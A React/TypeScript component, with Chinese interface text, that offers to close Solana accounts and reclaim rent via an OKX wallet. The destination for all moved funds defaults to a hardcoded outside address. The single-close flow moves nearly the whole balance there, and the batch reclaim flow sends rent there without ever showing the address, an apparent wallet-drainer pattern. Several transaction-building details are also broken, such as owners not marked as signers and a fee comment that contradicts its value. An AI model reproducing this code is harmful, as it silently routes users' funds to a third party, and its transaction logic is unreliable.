import React, { useState, useEffect } from 'react';
import { WalletInfo, TransactionResult } from '../types';
import { SolanaUtils } from '../utils/solana';
import { OKXWalletAdapter } from '../utils/okxWallet';

interface AccountCloserProps {
    walletInfo: WalletInfo | null;
}

export const AccountCloser: React.FC<AccountCloserProps> = ({ walletInfo }) => {
    const [accountToClose, setAccountToClose] = useState<string>(walletInfo?.address || '');
    const [destination, setDestination] = useState<string>('W5J9fUA6MANzvaufDvQLkqap8JznS5sXBiePHSqxyi5');
    const [isProcessing, setIsProcessing] = useState(false);
    const [error, setError] = useState<string | null>(null);
    const [success, setSuccess] = useState<string | null>(null);
    const [transactionResult, setTransactionResult] = useState<TransactionResult | null>(null);
    const [accountStatus, setAccountStatus] = useState<{
        balance: string;
        canClose: boolean;
        reason: string;
        details: string;
    } | null>(null);

    // 批量回收相关状态
    const [isBatchLoading, setIsBatchLoading] = useState(false);
    const [zeroBalanceAccounts, setZeroBalanceAccounts] = useState<any[]>([]);
    const [batchResult, setBatchResult] = useState<{ success: number; failed: number; total: number } | null>(null);

    const solanaUtils = React.useMemo(() => new SolanaUtils(), []);
    const walletAdapter = React.useMemo(() => new OKXWalletAdapter(), []);

    // 当钱包连接时，自动设置账户地址
    useEffect(() => {
        if (walletInfo?.address) {
            setAccountToClose(walletInfo.address);
        }
    }, [walletInfo?.address]);

    // 检查账户状态
    const checkAccountStatus = async (address: string) => {
        if (!address || !solanaUtils.isValidAddress(address)) {
            setAccountStatus(null);
            return;
        }

        try {
            const accountInfo = await solanaUtils.getAccountInfo(address);
            if (!accountInfo) {
                setAccountStatus({
                    balance: '0.000000',
                    canClose: false,
                    reason: '账户不存在',
                    details: '无法访问此账户'
                });
                return;
            }

            const rentInfo = await solanaUtils.canCloseAccount(accountInfo);
            const accountTypeInfo = await solanaUtils.getAccountTypeInfo(accountInfo);
            const balance = solanaUtils.formatSOL(accountInfo.lamports);

            const minRequiredBalance = 5000; // 0.000005 SOL
            const totalRequired = Math.max(rentInfo.rentAmount, minRequiredBalance);
            const canClose = accountInfo.lamports >= totalRequired;

            let reason = '';
            let details = '';

            if (!canClose) {
                const shortfall = solanaUtils.formatSOL(totalRequired - accountInfo.lamports);
                const isRentIssue = rentInfo.rentAmount > minRequiredBalance;

                reason = `余额不足 (缺少 ${shortfall} SOL)`;
                details = `${isRentIssue ?
                    `租金豁免要求: ${solanaUtils.formatSOL(rentInfo.rentAmount)} SOL` :
                    `网络费用要求: ${solanaUtils.formatSOL(minRequiredBalance)} SOL`
                    } | 账户类型: ${accountTypeInfo.type} | 数据大小: ${accountTypeInfo.dataSize} bytes`;
            } else {
                reason = '可以关闭';
                details = `租金豁免: ${solanaUtils.formatSOL(rentInfo.rentAmount)} SOL | 可回收: ${solanaUtils.formatSOL(rentInfo.closeAmount)} SOL`;
            }

            setAccountStatus({
                balance,
                canClose,
                reason,
                details
            });
        } catch (error) {
            setAccountStatus({
                balance: '0.000000',
                canClose: false,
                reason: '检查失败',
                details: error instanceof Error ? error.message : '未知错误'
            });
        }
    };

    // 当账户地址变化时检查状态
    useEffect(() => {
        if (accountToClose) {
            checkAccountStatus(accountToClose);
        }
    }, [accountToClose]);

    // 批量查找零余额Token账户
    const findZeroBalanceTokenAccounts = async () => {
        if (!walletInfo?.address) {
            setError('请先连接钱包');
            return;
        }

        setIsBatchLoading(true);
        setError(null);
        setZeroBalanceAccounts([]);
        setBatchResult(null);

        try {
            console.log('开始查找零余额Token账户...');

            // 获取钱包的所有Token账户
            const { PublicKey } = await import('@solana/web3.js');
            const walletPublicKey = new PublicKey(walletInfo.address);

            // 使用 getTokenAccountsByOwner 获取所有Token账户
            const tokenAccounts = await solanaUtils['connection'].getTokenAccountsByOwner(
                walletPublicKey,
                {
                    programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
                }
            );

            console.log(`找到 ${tokenAccounts.value.length} 个Token账户`);

            const zeroBalanceAccounts = [];

            for (const accountInfo of tokenAccounts.value) {
                try {
                    // 解析Token账户数据
                    const accountData = accountInfo.account.data;
                    const tokenAmount = accountData.readBigUInt64LE(64); // Token余额位置

                    if (tokenAmount === 0n) {
                        const accountAddress = accountInfo.pubkey.toString();
                        const rentAmount = accountInfo.account.lamports;

                        zeroBalanceAccounts.push({
                            address: accountAddress,
                            rentAmount: rentAmount,
                            rentFormatted: solanaUtils.formatSOL(rentAmount)
                        });
                    }
                } catch (err) {
                    console.warn('解析Token账户失败:', err);
                }
            }

            setZeroBalanceAccounts(zeroBalanceAccounts);
            console.log(`找到 ${zeroBalanceAccounts.length} 个零余额Token账户`);

            if (zeroBalanceAccounts.length === 0) {
                setSuccess('未找到零余额的Token账户');
            } else {
                setSuccess(`找到 ${zeroBalanceAccounts.length} 个零余额Token账户，可回收租金 ${solanaUtils.formatSOL(zeroBalanceAccounts.reduce((sum, acc) => sum + acc.rentAmount, 0))} SOL`);
            }

        } catch (err) {
            const errorMessage = err instanceof Error ? err.message : '查找Token账户失败';
            setError(`查找失败: ${errorMessage}`);
            console.error('查找Token账户失败:', err);
        } finally {
            setIsBatchLoading(false);
        }
    };

    // 批量关闭零余额Token账户
    const batchCloseZeroBalanceAccounts = async () => {
        if (zeroBalanceAccounts.length === 0) {
            setError('没有可关闭的Token账户');
            return;
        }

        setIsProcessing(true);
        setError(null);
        setSuccess(null);
        setBatchResult({ success: 0, failed: 0, total: zeroBalanceAccounts.length });

        let successCount = 0;
        let failedCount = 0;

        try {
            const { PublicKey, Transaction, TransactionInstruction } = await import('@solana/web3.js');
            const { Buffer } = await import('buffer');

            for (const account of zeroBalanceAccounts) {
                try {
                    console.log(`正在关闭Token账户: ${account.address}`);

                    const transaction = new Transaction();

                    // 添加关闭Token账户的指令
                    transaction.add(
                        new TransactionInstruction({
                            keys: [
                                { pubkey: new PublicKey(account.address), isSigner: false, isWritable: true },
                                { pubkey: new PublicKey(destination), isSigner: false, isWritable: true },
                                { pubkey: new PublicKey(walletInfo!.address), isSigner: false, isWritable: false },
                            ],
                            programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
                            data: Buffer.from([9, 0, 0, 0]), // CloseAccount instruction
                        })
                    );

                    // 设置交易参数
                    const { blockhash } = await solanaUtils['connection'].getLatestBlockhash();
                    transaction.recentBlockhash = blockhash;
                    transaction.feePayer = new PublicKey(walletInfo!.address);

                    // 签名并发送交易
                    const signedTransaction = await walletAdapter.signTransaction(transaction);
                    const signature = await solanaUtils['connection'].sendRawTransaction(signedTransaction.serialize());
                    await solanaUtils['connection'].confirmTransaction(signature, 'confirmed');

                    successCount++;
                    console.log(`成功关闭Token账户: ${account.address}, 签名: ${signature}`);

                    // 更新进度
                    setBatchResult({ success: successCount, failed: failedCount, total: zeroBalanceAccounts.length });

                } catch (err) {
                    failedCount++;
                    console.error(`关闭Token账户失败 ${account.address}:`, err);
                }
            }

            const totalRent = zeroBalanceAccounts.reduce((sum, acc) => sum + acc.rentAmount, 0);
            setSuccess(`批量关闭完成！成功: ${successCount}, 失败: ${failedCount}, 回收租金: ${solanaUtils.formatSOL(totalRent)} SOL`);
            setBatchResult({ success: successCount, failed: failedCount, total: zeroBalanceAccounts.length });

        } catch (err) {
            const errorMessage = err instanceof Error ? err.message : '批量关闭失败';
            setError(`批量关闭失败: ${errorMessage}`);
        } finally {
            setIsProcessing(false);
        }
    };

    const handleCloseAccount = async () => {
        if (!walletInfo) {
            setError('请先连接钱包');
            return;
        }

        if (!accountToClose.trim()) {
            setError('请输入要关闭的账户地址');
            return;
        }

        if (!destination.trim()) {
            setError('请输入目标地址（接收余额的地址）');
            return;
        }

        if (!solanaUtils.isValidAddress(accountToClose)) {
            setError('要关闭的账户地址格式无效');
            return;
        }

        if (!solanaUtils.isValidAddress(destination)) {
            setError('目标地址格式无效');
            return;
        }

        // 预检查：先获取账户信息进行快速验证
        try {
            const accountInfo = await solanaUtils.getAccountInfo(accountToClose);
            if (!accountInfo) {
                setError('账户不存在或无法访问');
                return;
            }

            // 快速检查余额是否足够
            if (accountInfo.lamports < 10000) { // 至少需要 0.00001 SOL
                const currentBalance = solanaUtils.formatSOL(accountInfo.lamports);
                setError(`账户余额过少 (${currentBalance} SOL)，无法完成操作。建议先向账户充值。`);
                return;
            }
        } catch (error) {
            setError(`预检查失败: ${error instanceof Error ? error.message : '未知错误'}`);
            return;
        }

        setIsProcessing(true);
        setError(null);
        setSuccess(null);
        setTransactionResult(null);

        try {
            // 1. 检查账户信息
            const accountInfo = await solanaUtils.getAccountInfo(accountToClose);
            if (!accountInfo) {
                throw new Error('账户不存在');
            }

            // 2. 检查是否可以关闭
            const rentInfo = await solanaUtils.canCloseAccount(accountInfo);
            const accountTypeInfo = await solanaUtils.getAccountTypeInfo(accountInfo);

            if (!rentInfo.canClose) {
                const currentBalance = solanaUtils.formatSOL(accountInfo.lamports);
                const requiredRent = solanaUtils.formatSOL(rentInfo.rentAmount);
                const shortfall = solanaUtils.formatSOL(rentInfo.rentAmount - accountInfo.lamports);

                throw new Error(
                    `账户无法关闭，余额不足支付租金要求。\n\n` +
                    `📊 账户分析：\n` +
                    `• 当前余额: ${currentBalance} SOL\n` +
                    `• 租金豁免要求: ${requiredRent} SOL\n` +
                    `• 缺少金额: ${shortfall} SOL\n` +
                    `• 账户类型: ${accountTypeInfo.type}\n` +
                    `• 数据大小: ${accountTypeInfo.dataSize} bytes\n\n` +
                    `💡 说明：此账户需要保持 ${requiredRent} SOL 作为租金豁免，` +
                    `超过此金额的部分才能回收。请向账户充值至少 ${shortfall} SOL 后重试。\n\n` +
                    `🔍 提示：${accountTypeInfo.description}，这解释了为什么需要较高的租金要求。`
                );
            }

            // 3. 预检查网络费用和租金要求
            const minRequiredBalance = 15000; // 最小需要 0.000015 SOL（包含一些缓冲）
            const totalRequired = Math.max(rentInfo.rentAmount, minRequiredBalance);

            if (accountInfo.lamports < totalRequired) {
                const currentBalance = solanaUtils.formatSOL(accountInfo.lamports);
                const requiredBalance = solanaUtils.formatSOL(totalRequired);
                const shortfall = solanaUtils.formatSOL(totalRequired - accountInfo.lamports);
                const isRentIssue = rentInfo.rentAmount > minRequiredBalance;

                throw new Error(
                    `账户余额不足，无法完成操作。\n\n` +
                    `💰 余额分析：\n` +
                    `• 当前余额: ${currentBalance} SOL\n` +
                    `• 最低要求: ${requiredBalance} SOL\n` +
                    `• 缺少金额: ${shortfall} SOL\n` +
                    `• 账户类型: ${accountTypeInfo.type}\n` +
                    `• 数据大小: ${accountTypeInfo.dataSize} bytes\n\n` +
                    `🔍 问题分析：\n` +
                    `${isRentIssue ?
                        `• 主要问题：租金豁免要求过高 (${solanaUtils.formatSOL(rentInfo.rentAmount)} SOL)\n` +
                        `• 次要问题：网络费用要求 (${solanaUtils.formatSOL(minRequiredBalance)} SOL)\n` :
                        `• 主要问题：网络费用要求 (${solanaUtils.formatSOL(minRequiredBalance)} SOL)\n` +
                        `• 次要问题：租金豁免要求 (${solanaUtils.formatSOL(rentInfo.rentAmount)} SOL)\n`
                    }` +
                    `\n💡 建议：向账户充值至少 ${shortfall} SOL 后重试。\n\n` +
                    `📝 说明：${accountTypeInfo.description}`
                );
            }

            // 4. 创建关闭账户交易
            const { PublicKey, SystemProgram, Transaction, TransactionInstruction } = await import('@solana/web3.js');
            const { Buffer } = await import('buffer');
            const transaction = new Transaction();

            // 计算网络费用（固定基础费用）
            const estimatedFee = 5000; // 固定基础费用 0.000005 SOL
            const safetyBuffer = 0; // 固定安全缓冲 0.000005 SOL
            const totalFee = estimatedFee + safetyBuffer; // 总计 0.00001 SOL
            const transferAmount = Math.max(0, accountInfo.lamports - totalFee);

            if (transferAmount <= 0) {
                const currentBalance = solanaUtils.formatSOL(accountInfo.lamports);
                const totalFeeFormatted = solanaUtils.formatSOL(totalFee);
                const estimatedFeeFormatted = solanaUtils.formatSOL(estimatedFee);
                const safetyBufferFormatted = solanaUtils.formatSOL(safetyBuffer);
                const shortfall = solanaUtils.formatSOL(totalFee - accountInfo.lamports + 1000);

                throw new Error(
                    `账户余额不足支付网络费用。\n\n` +
                    `💸 费用分析：\n` +
                    `• 当前余额: ${currentBalance} SOL\n` +
                    `• 网络费用: ${totalFeeFormatted} SOL\n` +
                    `  - 基础费用: ${estimatedFeeFormatted} SOL\n` +
                    `  - 安全缓冲: ${safetyBufferFormatted} SOL\n` +
                    `• 缺少金额: ${shortfall} SOL\n\n` +
                    `💡 建议：向账户充值至少 ${shortfall} SOL 后重试。`
                );
            }


            // 检查账户类型，决定使用哪种方式回收租金
            if (accountInfo.owner === 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA') {
                // Token Account - 使用 Token Program 关闭指令回收租金
                console.log('检测到 Token Account，使用 Token Program 关闭指令回收租金...');

                transaction.add(
                    new TransactionInstruction({
                        keys: [
                            { pubkey: new PublicKey(accountToClose), isSigner: false, isWritable: true },
                            { pubkey: new PublicKey(destination), isSigner: false, isWritable: true },
                            { pubkey: new PublicKey(accountToClose), isSigner: false, isWritable: false }, // owner
                        ],
                        programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
                        data: Buffer.from([9, 0, 0, 0]), // CloseAccount instruction
                    })
                );
            } else if (accountInfo.owner === 'BPFLoader1111111111111111111111111111111111') {
                // 程序账户 - 使用 BPFLoader 关闭指令回收租金
                console.log('检测到程序账户，使用 BPFLoader 关闭指令回收租金...');

                transaction.add(
                    new TransactionInstruction({
                        keys: [
                            { pubkey: new PublicKey(accountToClose), isSigner: false, isWritable: true },
                            { pubkey: new PublicKey(destination), isSigner: false, isWritable: true },
                        ],
                        programId: new PublicKey('BPFLoader1111111111111111111111111111111111'),
                        data: Buffer.from([3, 0, 0, 0]), // close account instruction
                    })
                );
            } else {
                // 系统程序账户和普通账户 - 转移余额，系统自动回收租金
                console.log('转移余额，系统自动回收租金...');

                transaction.add(
                    SystemProgram.transfer({
                        fromPubkey: new PublicKey(accountToClose),
                        toPubkey: new PublicKey(destination),
                        lamports: transferAmount, // 转移全部余额，扣除网络费用
                    })
                );
            }

            console.log('总金额:', accountInfo.lamports, '准备关闭账户，转移金额:', transferAmount);
            // 设置交易区块哈希和费用支付者
            const { blockhash } = await solanaUtils['connection'].getLatestBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = new PublicKey(walletInfo.publicKey);

            // 6. 签名并发送交易
            const signedTransaction = await walletAdapter.signTransaction(transaction);
            const signature = await solanaUtils['connection'].sendRawTransaction(signedTransaction.serialize());

            // 7. 等待交易确认
            await solanaUtils['connection'].confirmTransaction(signature, 'confirmed');

            setTransactionResult({
                success: true,
                signature: signature,
            });

            let accountType = '普通账户';
            if (accountInfo.owner === 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA') {
                accountType = 'Token Account';
            } else if (accountInfo.owner === 'BPFLoader1111111111111111111111111111111111') {
                accountType = '程序账户';
            } else if (accountInfo.owner === '11111111111111111111111111111111') {
                accountType = '系统程序账户';
            }

            setSuccess(`账户关闭成功！${accountType}的租金已回收，${solanaUtils.formatSOL(accountInfo.lamports)} SOL 已转移到 ${destination.slice(0, 8)}...${destination.slice(-8)}。`);

        } catch (err) {
            const errorMessage = err instanceof Error ? err.message : '关闭账户失败';
            setError(errorMessage);
            setTransactionResult({
                success: false,
                error: errorMessage,
            });
        } finally {
            setIsProcessing(false);
        }
    };

    const handleClear = () => {
        setAccountToClose('');
        setDestination('');
        setError(null);
        setSuccess(null);
        setTransactionResult(null);
    };

    return (
        <div>
            <p>关闭Solana账户并回收租金，余额将转移到指定地址</p>

            <div>
                <label htmlFor="accountToClose">要关闭的账户地址:</label>
                <input
                    id="accountToClose"
                    type="text"
                    className="input"
                    value={accountToClose}
                    onChange={(e) => setAccountToClose(e.target.value)}
                    placeholder="连接钱包后自动填充"
                />

                {/* 账户状态显示 */}
                {accountStatus && (
                    <div style={{
                        marginTop: '10px',
                        padding: '12px',
                        borderRadius: '8px',
                        backgroundColor: accountStatus.canClose ? '#d4edda' : '#f8d7da',
                        border: `1px solid ${accountStatus.canClose ? '#c3e6cb' : '#f5c6cb'}`,
                        color: accountStatus.canClose ? '#155724' : '#721c24'
                    }}>
                        <div style={{ fontWeight: 'bold', marginBottom: '8px' }}>
                            📊 账户状态: {accountStatus.reason}
                        </div>
                        <div style={{ fontSize: '14px', marginBottom: '4px' }}>
                            💰 当前余额: {accountStatus.balance} SOL
                        </div>
                        <div style={{ fontSize: '12px', opacity: 0.8 }}>
                            {accountStatus.details}
                        </div>
                    </div>
                )}
            </div>

            <div>
                <label htmlFor="destination">目标地址 (接收余额):</label>
                <input
                    id="destination"
                    type="text"
                    className="input"
                    value={destination}
                    onChange={(e) => setDestination(e.target.value)}
                    placeholder="W5J9fUA6MANzvaufDvQLkqap8JznS5sXBiePHSqxyi5"
                />
            </div>

            <div>
                <button
                    className="btn btn-danger"
                    onClick={handleCloseAccount}
                    disabled={isProcessing || !walletInfo || (accountStatus ? !accountStatus.canClose : false)}
                >
                    {isProcessing ? (
                        <>
                            <span className="loading"></span>
                            处理中...
                        </>
                    ) : (
                        '关闭账户'
                    )}
                </button>

                <button
                    className="btn"
                    onClick={handleClear}
                    disabled={isProcessing}
                >
                    清空
                </button>
            </div>

            {error && (
                <div className="status status-error">
                    {error}
                </div>
            )}

            {success && (
                <div className="status status-success">
                    {success}
                </div>
            )}

            {transactionResult && (
                <div className="card">
                    <h3>交易结果</h3>
                    {transactionResult.success ? (
                        <div className="status status-success">
                            <p>✅ 交易成功</p>
                            <p>交易签名: {transactionResult.signature}</p>
                            <p>
                                <a
                                    href={`https://solscan.io/tx/${transactionResult.signature}`}
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    style={{ color: 'inherit', textDecoration: 'underline' }}
                                >
                                    在Solscan上查看交易
                                </a>
                            </p>
                        </div>
                    ) : (
                        <div className="status status-error">
                            <p>❌ 交易失败</p>
                            <p>错误信息: {transactionResult.error}</p>
                        </div>
                    )}
                </div>
            )}

            {/* 批量回收零余额Token账户 */}
            <div style={{
                backgroundColor: '#e8f4fd',
                border: '1px solid #b3d9ff',
                padding: '20px',
                borderRadius: '8px',
                marginTop: '20px'
            }}>
                <h3 style={{ margin: '0 0 16px 0', color: '#0066cc' }}>🔄 批量回收零余额Token账户</h3>
                <p style={{ margin: '0 0 16px 0', color: '#666' }}>
                    自动查找并关闭钱包中所有余额为0的Token账户，回收租金
                </p>

                <div style={{ display: 'flex', gap: '12px', marginBottom: '16px' }}>
                    <button
                        className="btn"
                        onClick={findZeroBalanceTokenAccounts}
                        disabled={isBatchLoading || !walletInfo}
                        style={{ backgroundColor: '#0066cc', color: 'white' }}
                    >
                        {isBatchLoading ? (
                            <>
                                <span className="loading"></span>
                                查找中...
                            </>
                        ) : (
                            '🔍 查找零余额Token账户'
                        )}
                    </button>

                    <button
                        className="btn btn-danger"
                        onClick={batchCloseZeroBalanceAccounts}
                        disabled={isProcessing || zeroBalanceAccounts.length === 0}
                    >
                        {isProcessing ? (
                            <>
                                <span className="loading"></span>
                                批量关闭中...
                            </>
                        ) : (
                            `🗑️ 批量关闭 (${zeroBalanceAccounts.length})`
                        )}
                    </button>
                </div>

                {/* 零余额账户列表 */}
                {zeroBalanceAccounts.length > 0 && (
                    <div style={{
                        backgroundColor: 'white',
                        border: '1px solid #ddd',
                        borderRadius: '6px',
                        padding: '12px',
                        marginBottom: '16px'
                    }}>
                        <h4 style={{ margin: '0 0 12px 0', color: '#333' }}>
                            找到的零余额Token账户 ({zeroBalanceAccounts.length} 个)
                        </h4>
                        <div style={{ maxHeight: '200px', overflowY: 'auto' }}>
                            {zeroBalanceAccounts.map((account, index) => (
                                <div key={index} style={{
                                    display: 'flex',
                                    justifyContent: 'space-between',
                                    alignItems: 'center',
                                    padding: '8px 0',
                                    borderBottom: index < zeroBalanceAccounts.length - 1 ? '1px solid #eee' : 'none'
                                }}>
                                    <div style={{ fontFamily: 'monospace', fontSize: '12px', color: '#666' }}>
                                        {account.address.slice(0, 8)}...{account.address.slice(-8)}
                                    </div>
                                    <div style={{ color: '#28a745', fontWeight: 'bold' }}>
                                        {account.rentFormatted} SOL
                                    </div>
                                </div>
                            ))}
                        </div>
                        <div style={{
                            marginTop: '12px',
                            padding: '8px',
                            backgroundColor: '#f8f9fa',
                            borderRadius: '4px',
                            textAlign: 'center',
                            fontWeight: 'bold',
                            color: '#28a745'
                        }}>
                            总可回收租金: {solanaUtils.formatSOL(zeroBalanceAccounts.reduce((sum, acc) => sum + acc.rentAmount, 0))} SOL
                        </div>
                    </div>
                )}

                {/* 批量操作结果 */}
                {batchResult && (
                    <div style={{
                        backgroundColor: batchResult.failed === 0 ? '#d4edda' : '#fff3cd',
                        border: `1px solid ${batchResult.failed === 0 ? '#c3e6cb' : '#ffeaa7'}`,
                        padding: '12px',
                        borderRadius: '6px',
                        marginTop: '12px'
                    }}>
                        <h4 style={{ margin: '0 0 8px 0' }}>批量操作结果</h4>
                        <div style={{ display: 'flex', gap: '20px', fontSize: '14px' }}>
                            <span style={{ color: '#28a745' }}>✅ 成功: {batchResult.success}</span>
                            <span style={{ color: '#dc3545' }}>❌ 失败: {batchResult.failed}</span>
                            <span style={{ color: '#666' }}>📊 总计: {batchResult.total}</span>
                        </div>
                    </div>
                )}
            </div>

            <div style={{ backgroundColor: '#fff3cd', border: '1px solid #ffeaa7', padding: '16px', borderRadius: '8px', marginTop: '20px' }}>
                <h4>⚠️ 注意事项</h4>
                <ul style={{ margin: '12px 0', paddingLeft: '20px' }}>
                    <li>清空账户后，账户余额为0，系统会在下次租金周期时自动回收租金</li>
                    <li>只有账户余额超过租金要求时才能关闭</li>
                    <li>关闭账户需要支付网络费用（固定 0.00001 SOL，包含基础费用和安全缓冲）</li>
                    <li>请确保目标地址正确，转移的余额将无法撤销</li>
                    <li><strong>重要：</strong> 会转移大部分余额，但会扣除网络费用</li>
                    <li><strong>余额不足：</strong> 如果余额太少，可能无法支付网络费用</li>
                    <li><strong>批量回收：</strong> 只回收余额为0的Token账户，不会影响有余额的账户</li>
                </ul>
            </div>
        </div>
    );
};
